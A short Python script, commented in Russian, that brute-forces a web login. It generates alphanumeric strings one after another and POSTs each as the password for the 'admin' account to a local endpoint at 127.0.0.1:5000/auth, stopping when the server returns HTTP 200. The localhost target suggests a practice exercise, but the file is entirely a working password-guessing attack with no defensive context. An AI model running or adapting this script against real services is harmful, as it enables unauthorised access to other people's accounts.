import requests

# Наш словарь из которого собираем пароль
symbols = '0123456789qwertyuiopasdfghjklzxcvbnm'
password_index = 0

def get_next_password():
    global password_index
    password = ''

    index = password_index
    while index > 0:
        rest = index % len(symbols)
        index = index // len(symbols)
        password += symbols[rest]
    password_index += 1
    return password


status_code = 0
step = 0
while status_code != 200:
    password = get_next_password()
    # print(password)
    r = requests.post('http://127.0.0.1:5000/auth', data={'login': 'admin', 'password': password})
    status_code = r.status_code
    if step % 100 == 0:
        print(password)
    step += 1

print(password)